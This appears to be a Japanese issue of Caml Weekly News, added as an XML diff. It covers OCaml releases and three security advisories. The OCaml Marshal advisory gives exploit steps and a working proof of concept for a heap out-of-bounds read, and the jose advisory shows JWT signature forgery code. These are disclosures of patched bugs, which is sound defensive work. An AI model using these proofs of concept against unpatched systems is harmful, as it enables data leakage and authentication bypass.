@@ -1,0 +1,549 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cwn>
+  <cwn_head>
+    <cwn_date>2026.09.15</cwn_date>
+    <cwn_prev>2026.09.08</cwn_prev>
+    <cwn_next>2026.09.22</cwn_next>
+    <cwn_date_text>2026年9月8日から15日まで</cwn_date_text>
+  </cwn_head>
+  <cwn_body>
+    <cwn_entry>
+      <cwn_title>opam 2.6.0~alpha1</cwn_title>
+      <cwn_url>https://discuss.ocaml.org/t/ann-opam-2-6-0-alpha1/18372/5</cwn_url>
+      <cwn_who>このスレッドを引き継ぎ、Kate が発表しました</cwn_who>
+      <cwn_what>
+こんにちは、
+
+最初のリリース候補 (2.6.0~rc1) が公開されました。問題がなければ、2.6.0 の安定版リリース前の最後のプレリリースになる予定です。
+何か問題がありましたらお知らせください。
+
+
+*** 2.6.0~beta2 からの主な変更点
+
+:hourglass_done: 主な変更点は、opam 2.5 と比較したパフォーマンス低下のもう一つの修正です。http リポジトリ（デフォルトの opam.ocaml.org など）からのパッケージが、リポジトリデータベースへの不要な読み取りによりインストールが遅くなっていた問題が修正されました ([#7131](https://github.com/ocaml/opam/issues/7131))。
+
+
+:open_book: 変更点の詳細については [ブログ記事](https://opam.ocaml.org/blog/opam-2-6-0-rc1/) をご覧ください。さらに詳細な情報は [リリースノート](https://github.com/ocaml/opam/releases/tag/2.6.0-rc1) または [変更履歴](https://github.com/ocaml/opam/blob/2.6.0-rc1/CHANGES) でご確認いただけます。
+
+*** 試してみましょう！
+
+アップグレード手順は変わっていません：
+
+Unix システムの場合
+#+begin_example
+bash -c "sh &lt;(curl -fsSL https://opam.ocaml.org/install.sh) --version 2.6.0~rc1"
+#+end_example
+Windows システムの PowerShell からの場合
+#+begin_example
+Invoke-Expression "&amp; { $(Invoke-RestMethod https://opam.ocaml.org/install.ps1) } -Version 2.6.0~rc1"
+#+end_example
+
+問題が発生した場合は [バグトラッカー](https://github.com/ocaml/opam/issues) にご報告ください。
+
+Happy hacking,
+&lt;&gt; &lt;&gt; The opam team &lt;&gt; &lt;&gt; :camel:
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>tiny_httpd 0.22</cwn_title>
+      <cwn_url>https://discuss.ocaml.org/t/ann-tiny-httpd-0-22/18520/1</cwn_url>
+      <cwn_who>Simon Cruanes が発表しました</cwn_who>
+      <cwn_what>
+こんにちは、[tiny_httpd 0.22](https://github.com/c-cube/tiny_httpd/releases/tag/v0.22) のリリースをお知らせします。
+
+Tiny_httpd は HTTP 1.1 サーバーで、websocket、SSE の基本的なサポートと、プラガブルな IO/並行処理（ダイレクトスタイルである限り）を備えています。依存関係をなるべく少なくシンプルに保つことを目標としており、それにもかかわらず 2019 年からずっと問題なく動作しています™。このリリースは主にバグ修正です（バグ報告がどこから来たのかについては、意味深な目くばせをするに留めておきます）。
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>Owebview 0.1 — OCaml からネイティブデスクトップウィンドウに Web UI を表示</cwn_title>
+      <cwn_url>https://discuss.ocaml.org/t/ann-owebview-0-1-native-desktop-windows-with-a-web-ui-from-ocaml/18521/1</cwn_url>
+      <cwn_who>Korkorran が発表しました</cwn_who>
+      <cwn_what>
+みなさん、こんにちは、
+
+*[Owebview](https://github.com/korkorran/Owebview)* の最初のリリースを発表できて嬉しいです。これは [webview](https://github.com/webview/webview) の OCaml バインディングで、OCaml アプリに組み込み Web レンダリングエンジンを埋め込むことができます。opam で利用可能になりました：
+
+#+begin_example
+opam install owebview
+#+end_example
+
+Owebview は OS ネイティブの Web エンジンをバックエンドとするネイティブウィンドウを開きます。macOS では WebKit、Linux では WebKitGTK、Windows では WebView2 を使用し、OCaml から制御できます。Electron も、バンドラーも、パッケージ化されたブラウザも不要です。シングル実行ファイルといくつかの HTML だけです。
+
+なぜ Owebview が [OCaml の GUI に最適なソリューションであるか](https://korkorran.github.io/posts/2026-09-08-owebview-a-solution-for-ocaml-guis/)についてのブログ記事もご覧ください。
+
+#+attr_html: :width 80%
+https://us1.discourse-cdn.com/flex020/uploads/ocaml/optimized/2X/e/eaadf6ffedf65e541785aaf5c87fad94d78cb13d_2_1380x916.webp
+#+begin_center
+*three.js ライブラリを使ったサンプルウィンドウ*
+#+end_center
+
+*** ネイティブ依存関係
+
+システムの Web エンジンのみで、それ以外は必要ありません：
+- *macOS* — WebKit / Cocoa は既にシステムに含まれています。インストール不要です。
+- *Linux* — ~gtk+-3.0~ と ~webkit2gtk-4.1~ が必要で、~conf-gtk3-webkit~ opam パッケージ（本リリースとあわせて公開）によって取り込まれるため、~opam install~ でお使いのディストリビューション向けの depexts が解決されます。
+- *Windows* — WebView2 ランタイムは Windows 10 および 11 に同梱されています。SDK ヘッダーはビルド時に NuGet キャッシュから検索されます（~nuget install Microsoft.Web.WebView2~）。
+
+webview ヘッダー自体は *vendored* されているため、ビルド時に何かがフェッチされることはなく、プラットフォームのコンパイル/リンクフラグは ~dune-configurator~ スクリプトによって検出されます。
+
+*** サンプル
+
+リポジトリにはいくつかの実行可能なサンプルが含まれています：
+#+begin_example
+dune exec examples/hellowv/hellowv.exe          # バインディング、アセット、Dock アイコン
+dune exec examples/timer/timer_posix.exe        # スレッド + ディスパッチ
+dune exec examples/timer/timer_lwt.exe          # 同じもの、Lwt で動作
+dune exec examples/d3/d3.exe                    # D3.js チャート
+dune exec examples/three/three.exe              # three.js による WebGL
+dune exec examples/js_of_ocaml/hellowv.exe      # フロントエンドも OCaml で書かれたもの
+#+end_example
+
+最後のサンプルは一つの言語でエンドツーエンドを実現するアイデアに興味がある方には特におすすめです。ページのロジックは [Brr](https://erratique.ch/software/brr) を使って書かれ、~js_of_ocaml~ でコンパイルされているため、ブリッジの両側が OCaml になります。
+
+*** チュートリアル
+最初のウィンドウ表示から完全なアプリケーションまでを段階的に構築する 6 ステップの[チュートリアル](https://github.com/korkorran/Owebview/tree/main/tutorial)があります。ディスク上のアセット、JS ↔ OCaml ブリッジ、Lwt を使った非同期バックエンド、100% OCaml フロントエンド、アプリケーションアイコンのプラットフォーム固有の詳細などが含まれています。
+
+*** 設計方針
+
+これは意図的に *薄い* バインディングです。C API に近い形を保ち、より高レベルな利便性は呼び出し元に委ねています。特に、バインディングの引数と結果は JSON *テキスト* として交換されるため、JSON ライブラリの選択はユーザー次第です。
+
+*** フィードバック募集、特に Linux について
+
+Owebview は *macOS*、*Windows*、*Fedora*、*Ubuntu* でテストされています。
+他の Linux ディストリビューションでのビルドと動作についての報告は特に有益です。コンパイルできるか、depexts は解決されるか、~webkit2gtk-4.1~ バックエンドはお使いのディストリビューションで期待通りに動作するか、デスクトップ環境での Dock アイコンはどうなるか、なども教えていただければ幸いです。Windows に関する報告も歓迎します。
+
+このライブラリに興味がある方は、frederic.ln.lang@gmail.com までメールをお送りください。
+
+- *リポジトリ* — https://github.com/korkorran/Owebview
+- *ドキュメント* — https://korkorran.github.io/Owebview
+- *Issues* — https://github.com/korkorran/Owebview/issues
+- *ライセンス* — MIT
+
+このリリースへの貢献に対して @Chimrod に特別な感謝を。
+
+Happy hacking!
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>OSEC-2026-18: Marshal の整数オーバーフローによるヒープ外読み取り</cwn_title>
+      <cwn_who>Hannes Mehnert が発表しました</cwn_who>
+      <cwn_what>
+みなさん、
+
+OCaml ランタイムに関する新しいセキュリティアドバイザリが公開されました。アドバイザリの内容を以下に掲載します。また、
+https://github.com/ocaml/security-advisories および
+https://osv.dev/list?q=&amp;ecosystem=opam
+でもご確認いただけます。
+
+よろしくお願いします、
+
+Hannes
+
+#+begin_example
+id: OSEC-2026-18
+modified: "2026-09-10T10:00:00Z"
+published: "2026-09-10T10:00:00Z"
+severity: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+severity_score: "6.8"
+affected: "ocaml" {&lt; "5.5.1"}
+events: [
+   [
+     git "https://github.com/ocaml/ocaml" [
+       [fixed "928e7c8a950db8730e8e84105d3be347cae38f5c"]
+     ]
+   ]
+   [
+     git "https://github.com/ocaml/ocaml" [
+       [fixed "304654884d0c90b2e4ab673ff88caef38b05c714"]
+     ]
+   ]
+   [
+     git "https://github.com/ocaml/ocaml" [
+       [fixed "428288660cc1f655605347e09e2fbc0b0a404660"]
+     ]
+   ]
+]
+credits: [
+   [reporter "Akshay M Singh"]
+   [remediation_developer "Xavier Leroy"]
+   [remediation_reviewer "Nicolás Ojeda Bär"]
+   [remediation_reviewer "Antonin Décimo"]
+   [coordinator "Hannes Mehnert"]
+]
+cwe: [ CWE-190 CWE-125 ]
+aliases: [ CVE-2026-28364 ]
+references: [
+   [fix "https://github.com/ocaml/ocaml/pull/15019"]
+   [fix "https://github.com/ocaml/ocaml/pull/15030"]
+]
+related: [ OSEC-2026-01 ]
+#+end_example
+
+*** Marshal の整数オーバーフローによるヒープ外読み取り
+
+OCaml の Marshal デシリアライザーの長さ検証ロジックにおける整数オーバーフローにより、細工されたシリアライズオブジェクトが CVE-2026-28364 修正で追加されたすべての境界チェックをバイパスし、~Marshal.from_bytes~ / ~Marshal.from_string~（および C API の ~caml_input_value_from_block~）から**ヒープ境界外読み取り**が発生します。
+
+*** 根本原因
+
+~runtime/intern.c~ はデータ長の宣言値を入力バッファと照合しますが、この検証にはラップアラウンドが起きうる符号なし 64 ビット加算が使われています：
+
+#+begin_src c
+/* caml_input_val_from_bytes, intern.c:1038 */
+if (ofs + h.header_len + h.data_len > caml_string_length(str))
+   caml_failwith("input_val_from_string: bad length");
+#+end_src
+
+~h.data_len~ は完全に攻撃者が制御可能です（~Intext_magic_number_big~ の場合、ストリームから直接読み取る 8 バイトフィールド）。~data_len >= 2^64 - (ofs + h.header_len)~ とすると、合計がラップアラウンドして小さな値になり、チェックが通過します。
+
+CVE-2026-28364 の修正では以下が追加されました：
+
+#+begin_src c
+/* intern.c:1043 (修正で追加) */
+s->intern_src_end = s->intern_src + h.data_len;   /* バッファの前を指すポインタにラップアラウンド */
+#+end_src
+
+~intern_src_end~ が ~intern_src~ より前のアドレスにラップアラウンドするため、修正で追加されたすべての ~intern_check_read()~ 境界チェック（~len > end - src~ で差分が負になり巨大な ~uintnat~ に昇格）が現実的な長さに対して*偽*と評価されます。そしてパーサー（~intern_rec~）は攻撃者制御の読み取り長（~readblock~ で最大 ~Max_wosize~ バイト）を入力バッファを大きく超えたメモリに対して実行します。
+
+OCaml 側の ~stdlib/marshal.ml~ のラッパー検証も同じラップアラウンドを通じて ~caml_marshal_data_size~（intern.c:1116-1150）経由でバイパスされます：
+
+#+begin_src c
+return Val_long((header_len - 16) + data_len);   /* 0 または負にラップアラウンド */
+#+end_src
+
+~Marshal.from_bytes~（marshal.ml:55-62）は最初に ~data_size_unsafe~ を呼び出し、ラップアラウンドした ~len~（0 または負）を受け取り、再チェック ~ofs > Bytes.length buff - (header_size + len)~ が通過します。
+
+同じ未チェックのラップアラウンドは ~caml_input_value_from_buffer~（intern.c:1080）にも存在し、公開 C API の ~caml_input_value_from_block~ および ~caml_input_value_from_malloc~ で使用されています。これらには OCaml 側の検証がまったくありません。
+
+*** エクスプロイトの手順
+
+1. 32 バイトのヘッダーを作成：~Intext_magic_number_big~ + 4 バイトのパディング +
+   ~data_len = 2^64 - 16~ + ~num_objects = 0~ + ~whsize = 0~。
+2. 有効なオブジェクトコードバイトストリームを追加（例：「small string」コード
+   ~0x3F~ = 31 バイト、または任意の長さの ~CODE_STRING32~）。
+3. ~Marshal.from_bytes buf 0~（または ~Marshal.from_string~）を呼び出す。
+4. ~data_size_unsafe~ が 0 を返し、OCaml 側のチェックが通過。
+5. C 側のチェック ~0 + 32 + (2^64-16) = 16 > len~ が通過（ラップアラウンドにより）。
+6. ~intern_src_end~ が ~buf + 16~ にラップアラウンドし、すべての ~intern_check_read~ が通過。
+7. ~intern_rec~ が攻撃者指定の ~len~ で ~readblock(s, dest, len)~ を実行し、
+   バッファ終端を超えたヒープメモリを返された文字列に ~memcpy~（情報漏洩）、
+   または巨大な ~len~（SIGBUS/SIGSEGV、DoS）。
+
+*** 概念実証
+
+テスト環境: macOS arm64、OCaml 5.5.0（Homebrew）、~ocamlopt~。
+
+**** 1. ヒープ情報開示（クリーン、クラッシュなし）
+
+#+begin_src ocaml
+let () =
+   let buf = Bytes.create 40 in
+   Bytes.set buf 0 (Char.chr 0x84); Bytes.set buf 1 (Char.chr 0x95);
+   Bytes.set buf 2 (Char.chr 0xa6); Bytes.set buf 3 (Char.chr 0xbf);
+   for i = 4 to 7 do Bytes.set buf i '\000' done;
+   for i = 8 to 15 do Bytes.set buf i '\xff' done;
+   Bytes.set buf 15 (Char.chr 0xf0);          (* data_len = 2^64 - 16 *)
+   for i = 16 to 31 do Bytes.set buf i '\000' done;  (* num_objects = whsize = 0 *)
+   Bytes.set buf 32 (Char.chr 0x3f);          (* small string, len 31 *)
+   for i = 33 to 39 do Bytes.set buf i 'A' done;     (* 実際には 7 バイトのみ続く *)
+   let s : string = Marshal.from_bytes buf 0 in
+   Printf.printf "len=%d content=%S\n" (String.length s) s
+#+end_src
+
+出力（40 バイトのバッファを超えた 24 バイトが返された文字列にリークされている）：
+
+#+begin_example
+len=31 
+content="AAAAAAA\000\000\000\000\000\000\007\000\b\000\000\000\000\000\000\152\018\001\003\001\000\000\000"
+#+end_example
+
+**** 2. サービス拒否（クラッシュ）
+
+同じヘッダー。ストリームバイト 32 = ~0x0A~（~CODE_STRING32~）、ビッグエンディアン
+~0x40000000~（1 GB）の長さ、37 バイトのバッファ：
+
+#+begin_example
+$ ./crash; echo "exit=$?"
+exit=138        (128 + SIGBUS)
+#+end_example
+
+*** タイムライン
+
+- 2026-08-15: security@ocaml.org へ報告
+- 2026-08-25: パッチ開発
+- 2026-09-03: trunk、5.5、4.14 ブランチへのパッチのマージ
+- 2026-09-05: OCaml 5.5.1 のリリース
+- 2026-09-10: アドバイザリ公開
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>OSEC-2026-19: JOSE における RSA 署名検証の欠如</cwn_title>
+      <cwn_who>Hannes Mehnert が発表しました</cwn_who>
+      <cwn_what>
+みなさん、
+
+jose パッケージに関する新しいセキュリティアドバイザリが公開されました。アドバイザリの内容を以下に掲載します。また、
+https://github.com/ocaml/security-advisories および
+https://osv.dev/list?q=&amp;ecosystem=opam
+でもご確認いただけます。
+
+よろしくお願いします、
+
+Hannes
+
+#+begin_example
+id: OSEC-2026-19
+modified: "2026-09-10T10:00:00Z"
+published: "2026-09-10T10:00:00Z"
+severity: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+severity_score: "9.1 (Critical)"
+affected: "jose" {&lt; "0.11.0"}
+events: [
+   [
+     git "https://github.com/ulrikstrid/ocaml-jose" [
+       [fixed "cf17d991ec6a0d1997956b6c7799890f9c28879e"]
+     ]
+   ]
+]
+credits: [
+   [reporter "Sergey Zhukaev"]
+   [coordinator "Hannes Mehnert"]
+   [coordinator "Konstantin Olkhovskiy"]
+   [remediation_developer "Ulrik Strid"]
+]
+cwe: [ CWE-347 ]
+#+end_example
+
+*** JOSE: RSA 署名検証の欠如
+
+opam パッケージ「jose」は RSA 署名を一切検証しません。エンコーディングが PKCS1 であることは確認しますが、公開鍵での検証を行いません。
+
+*** 再現方法
+
+jose 0.10.0 で、以下のコードは同じ鍵で 2 つのトークンに署名し、一方のペイロードをもう一方の署名に結合します：
+
+#+begin_src ocaml
+let () = Mirage_crypto_rng_unix.use_default ()
+
+let key =
+   Jose.Jwk.make_priv_rsa (Mirage_crypto_pk.Rsa.generate ~bits:2048 ())
+
+let sign sub =
+   Jose.Jwt.sign key ~payload:(`Assoc [ ("sub", `String sub) ])
+   |> Result.get_ok |> Jose.Jwt.to_string
+
+let seg n token = List.nth (String.split_on_char '.' token) n
+
+let alice = sign "alice" and admin = sign "admin"
+
+(* alice のヘッダーと署名、admin のペイロード *)
+let forged = String.concat "." [ seg 0 alice; seg 1 admin; seg 2 alice ]
+
+match
+   Jose.Jwt.unsafe_of_string forged
+   |> Result.get_ok
+   |> Jose.Jwt.validate ~jwk:(Jose.Jwk.pub_of_priv key) 
+~now:(Ptime_clock.now ())
+with
+   | Ok t ->
+     print_endline
+       ("accepted, sub = " ^ Option.get (Jose.Jwt.get_string_claim t "sub"))
+   | Error _ -> print_endline "rejected"
+#+end_src
+
+dune ファイル：
+#+begin_example
+(executable (name repro)
+(libraries jose mirage-crypto-pk mirage-crypto-rng.unix ptime.clock.os))
+#+end_example
+
+これは "accepted, sub = admin" と出力されます。
+
+*** 回避策
+
+現在、既知の回避策はありません。
+
+*** タイムライン
+
+- 2026-08-25: jose の作者へ非公開メールで報告
+- 2026-08-25: リポジトリに修正を公開
+- 2026-08-31: security@ocaml.org へメールをエスカレーション
+- 2026-09-04: jose 0.11.0 をリリース
+- 2026-09-10: アドバイザリ公開
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>OSEC-2026-20: Cstruct のインデックスバグによるフィルタ出力の破損と逆方向パース結果の誤り</cwn_title>
+      <cwn_who>Hannes Mehnert が発表しました</cwn_who>
+      <cwn_what>
+みなさん、
+
+cstruct パッケージに関する新しいセキュリティアドバイザリが公開されました。アドバイザリの内容を以下に掲載します。また、
+https://github.com/ocaml/security-advisories および
+https://osv.dev/list?q=&amp;ecosystem=opam
+でもご確認いただけます。
+
+よろしくお願いします、
+
+Hannes
+
+#+begin_example
+id: OSEC-2026-20
+modified: "2026-09-10T10:00:00Z"
+published: "2026-09-10T10:00:00Z"
+severity: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+severity_score: "7.3 (High)"
+affected: "cstruct" {&lt; "6.3.0"}
+events: [
+   [
+     git "https://github.com/mirage/ocaml-cstruct" [
+       [fixed "936f1010d3e9914da9c5c8a4739e9278a37e1c3e"]
+     ]
+   ]
+]
+credits: [
+   [reporter "Anil Madhavapeddy"]
+   [remediation_reviewer "Thomas Gazagnaire"]
+   [remediation_developer "Anil Madhavapeddy"]
+]
+references: [
+   [fix "https://github.com/mirage/ocaml-cstruct/pull/324"]
+]
+cwe: [ CWE-682 ]
+affected_bindings: [ "Cstruct.filter_map" "Cstruct.tail" "Cstruct.cuts" 
+"Cstruct.find" "Cstruct.find_rev" ]
+#+end_example
+
+*** Cstruct のインデックスバグによるフィルタ出力の破損と逆方向パース結果の誤り
+
+cstruct のいくつかの関数が誤ったデータを使用する可能性があり、予期しない例外の発生や破損したデータの返却につながります。
+
+*** 影響
+
+- ~Cstruct.filter_map~ は保持バイトを元の入力位置に書き込むため、前方のバイトが削除されると破損した出力が生成されます。
+- ~Cstruct.tail ~rev:true~ は 1 バイトではなく 2 バイトを削除し、1 バイトのビューに対して例外を発生させます。
+- ~Cstruct.cuts ~rev:true~ は入力を誤ったデータと比較し、誤った位置で分割し、要求されたビューの外側のオフセットを使って結果を構築する可能性があります。
+- ~Cstruct.find~ および ~Cstruct.find_sub ~rev:true~ は非ゼロオフセットのビューを操作する際に、誤った位置のスライスを返す可能性があります。
+
+これらは論理的なインデックスおよび境界計算エラー（CWE-682）であり、直接的なメモリ安全性の脆弱性ではありません。ただし、影響を受ける操作は破損したデータを返したり、予期しない例外を発生させたり、入力を誤って分割したり、要求された Cstruct ビューの外側（ただしバッキングバッファ内）のバイトを返す可能性があります。
+
+セキュリティに関わるパーサーでは、検証のバイパス、サービス拒否、または隣接バッファ内容の意図しない開示を引き起こす可能性があります。
+
+*** 回避策
+
+cstruct をアップグレードできないユーザーは対応するソース変更をバックポートする必要があります。これらはライブラリのバグによるものであり、設定ベースの緩和策はありません。
+
+*** 参考
+
+[Scrutineer](https://github.com/alpha-omega-security/scrutineer) とローカルで実行した Deepseek GLM-5.3 Flash を通じて発見されました。
+
+*** タイムライン
+
+- 2026-09-04: GitHub 経由で ocaml/security-advisories リポジトリに報告
+- 2026-09-05: security@ocaml.org へメールで報告
+- 2026-09-05: パッチの提案とレビュー
+- 2026-09-05: cstruct 6.3.0 のリリース
+- 2026-09-10: アドバイザリ公開
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>VSCode での Dune パッケージ管理サポート</cwn_title>
+      <cwn_url>https://discuss.ocaml.org/t/update-dune-package-management-support-in-vscode/18523/1</cwn_url>
+      <cwn_who>PizieDust が発表しました</cwn_who>
+      <cwn_what>
+Dune Package Management（DPM）に関する OCaml VSCode Extension の改善をお知らせします。このアップデートにはいくつかのバグ修正と使い勝手の向上が含まれています。
+今回のアップデートで、DPM をサンドボックスとして有効化するには：
+
+- まず、サンドボックスリストから「Dune Package Management」を選択します。
+- 次に、お使いのコンピューターにインストールされている dune バイナリの一覧が表示されます。dune バイナリを選択すると、プロジェクトで DPM が有効化されます。
+
+DPM が有効化されると、バックグラウンドで ~ocaml-lsp-server~ が初期化され、拡張機能は有益な提案を行います（例：DPM をまだ有効化していない場合に「lock」することを提案します）。（DPM の有効化は ~dune-workspace~ ファイルで行うか、~dune pkg lock~ を実行することで行えます。）
+両方が完了すると、うまく動作するようになります。
+
+/注意：/
+- /インストール済み依存関係の一覧表示、パッケージのアップグレードとアンインストールなど、opam サンドボックスでサポートされているその他の機能は、DPM ではまだサポートされていません。/
+- /watch モードで dune を実行したり、長時間実行される dune コマンドを実行したりすると、現在実行中のプロセスが終了するまで dune ビルドディレクトリがロックされるため、VSCode 上の DPM が正常に動作しない場合があります。/
+
+[プロジェクトボード](https://github.com/users/PizieDust/projects/4/views/1)で行った変更の詳細をご確認いただけます。
+この作業は [Pixie Dust](https://github.com/PizieDust)、[Timéo Arnouts](https://github.com/Tim-ats-d)、[Ulysse Gerard](https://github.com/voodoos)、[Sonja Heinze](https://github.com/pitag-ha)、[Shon Feder](https://github.com/shonfeder)、[Ali Caglayan](https://github.com/Alizter)、[Sudha Parimala](https://github.com/Sudha247) によって実現されました。
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>Liquidsoap 2.5.x: OCaml 5.x 並行処理の実践的な研究</cwn_title>
+      <cwn_url>https://discuss.ocaml.org/t/liquidsoap-2-5-x-a-practical-study-of-ocaml-5-x-concurrency/18525/1</cwn_url>
+      <cwn_who>Romain Beauxis が発表しました</cwn_who>
+      <cwn_what>
+【開示：以下にリンクされているコードとコンテンツの一部は自動化ツールの助けを借りて作成されています。この投稿はそうではありません。】
+
+数年間保留にした末、ついに liquidsoap プロジェクトを OCaml 5 に移行する時が来ました！[OCaml 5 の GC ペーシングを制御する](https://www.janestreet.com/tech-talks/the-saga-of-multicore-ocaml/)ための優れた取り組みにより、メモリの問題は過去のものになったという確信が持てました。
+
+私たちにとっての主な動機は、effects のやや型破りな（と私は思っています）使い方です。liquidsoap スクリプトの実行中にローカルで発生する操作の結果をグローバルに収集するためのものです。詳細は[こちら](https://www.liquidsoap.info/blog/2026-09-04-full-concurrency/#callbacks-that-can-be-removed)で説明されています。
+
+OCaml 5 への切り替えが完了したら、その恩恵を測定する時です！liquidsoap の特殊な立場は、I/O 集約型と CPU 集約型の両方の処理を行う点です。ネットワークやディスク操作の I/O と、メディアのエンコードおよびデコードの CPU です。そのため、両面をテストする良い機会になりました！
+
+[最初のブログ記事](https://www.liquidsoap.info/blog/2026-09-04-full-concurrency/)には、このトピックに関する詳細な情報が多く含まれており、私たちがいかにして[スケジューラー](https://www.liquidsoap.info/blog/2026-09-04-full-concurrency/#duppy-goes-multicore)（duppy と名付けています）をマルチコアの利点を最大限に活用できるように改良したかについても書かれています。初期設計（node/libev と非常に似ています）から 10 年後に、[I/O ワークフロー](https://www.liquidsoap.info/blog/2026-09-04-full-concurrency/#serving-http)でその設計が正しかったことが確認されて嬉しかったです。
+
+しかし CPU バウンドのワークフローでは、最初の実験が非常に重い映像処理に集中していたため、主に OCaml の外で行われるメディア計算が支配的で、あまり興味深い結果は得られませんでした。
+
+Liquidsoap はリアルタイムストリーミングループを実行しているため、マルチコアによる超高速処理の利点は、時間を先取りしないために 70% の時間を待機する必要があることでほぼ失われてしまうという面もあります。
+
+しかし、もっとよく考えてみると、良いユースケースは対照的に、1 つのオーディオエンコーディングが複数のソースで共有される状況です。オーディオエンコーディングはすでに計算量がはるかに少なく、共有される場合、OCaml レベルでの並行処理がより関連性を持ってきます。
+
+これは[2 番目のブログ記事](https://www.liquidsoap.info/blog/2026-09-09-concurrency-revisited/)で確認されました。すべてのクロック（リアルタイムでコンテンツを生成する抽象化）をシステムスレッドから duppy のドメインバックタスクに変換したところ…ついに実際の恩恵を確認できました：
+
+#+attr_html: :width 80%
+https://us1.discourse-cdn.com/flex020/uploads/ocaml/original/2X/1/1fe0adf5c3621b6d1c702e5492c3380e5ac1ea38.jpeg
+
+これは、マルチコア OCaml がオーディオストリームをサポートすることで、リアルタイムでデータを生成するには遅くなるまでに 1 プロセスがサポートできるストリーム数を 2 倍にできることを示しています。
+
+もう一つの興味深いグラフは、スレッドとドメイン実装の間のコンテキストスイッチ数です：
+
+#+attr_html: :width 80%
+https://us1.discourse-cdn.com/flex020/uploads/ocaml/original/2X/0/03da9a5a90d5891e28b6c2ff166cd16964dbb080.jpeg
+
+詳細：
+
+- https://www.liquidsoap.info/blog/2026-09-04-full-concurrency/
+- https://www.liquidsoap.info/blog/2026-09-09-concurrency-revisited/
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>OCaml 公開セキュリティミーティング</cwn_title>
+      <cwn_url>https://discuss.ocaml.org/t/ocaml-public-security-meeting/18526/1</cwn_url>
+      <cwn_who>Hannes Mehnert が発表しました</cwn_who>
+      <cwn_what>
+みなさん、
+
+9 月 15 日（火）14:00 CEST に、公開セキュリティミーティングを開催します。場所は https://meet.bornhack.dk/OCamlSecurityPublicMeeting です。
+
+自己紹介を行い、皆さんが持参したトピックについて喜んで議論します。暫定的なアジェンダ（現在は空です）は https://pad.data.coop/9DSTtGNnQyyehnJY_k-OHA でご確認いただけます。
+
+それではまた、
+
+Hannes &amp; セキュリティチーム
+      </cwn_what>
+    </cwn_entry>
+    <cwn_entry>
+      <cwn_title>dead_code_analyzer 1.2.1 および 1.3.0</cwn_title>
+      <cwn_url>https://discuss.ocaml.org/t/ann-dead-code-analyzer-1-2-1-and-1-3-0/18530/1</cwn_url>
+      <cwn_who>fantazio が発表しました</cwn_who>
+      <cwn_what>
+こんにちは、
+
+[dead_code_analyzer の 2 つのリリース](https://github.com/LexiFi/dead_code_analyzer/releases)（~opam~ から利用可能）をお知らせします：
+
+- リリース [1.2.1](https://github.com/LexiFi/dead_code_analyzer/releases/tag/1.2.1) はバグ修正のコレクションを含み、セマンティクスを強化します。このリリースは **OCaml 5.3** と互換性があります。
+
+- リリース [1.3.0](https://github.com/LexiFi/dead_code_analyzer/releases/tag/1.3.0) は 1.2.1 のアップデートで、**OCaml 4.14 - 5.5** の範囲までサポートを拡張します。OCaml &lt;= 5.2 と &gt;= 5.3 の間でいくつかの既知の結果不一致があり、[この Issue](https://github.com/LexiFi/dead_code_analyzer/issues/103) で追跡されています。主にオプション引数のセクションに影響します。
+  OCaml 4.14 がこのリリース 1.3.0 でサポートされるため、[私のフォークで利用可能だった](https://github.com/fantazio/dead_code_analyzer/tree/4.14)専用ブランチは削除されます。
+
+David Maison、@sim642、@kit-ty-kate、@nojb の貢献、レビュー、フィードバックに感謝します。
+資金提供をいただいた [LexiFi](https://www.lexifi.com/) にも感謝します！
+
+dead_code_analyzer を使用している、または使用したことがある方は、その経験や使い方について聞かせていただければ嬉しいです。こちらに投稿するか、DM を送るか、[corentin@fantazio.eu](mailto:corentin@fantazio.eu) にメールをお送りください。将来の開発の優先順位付けに役立ちますし、フィードバックを記事、プレゼンテーション、またはドキュメントにまとめるかもしれません。
+
+これらのリリースで問題が発生した場合は、[GitHub リポジトリに報告](https://github.com/LexiFi/dead_code_analyzer/issues)してください。
+フィードバックと貢献を歓迎します。
+      </cwn_what>
+    </cwn_entry>
+  </cwn_body>
+</cwn>
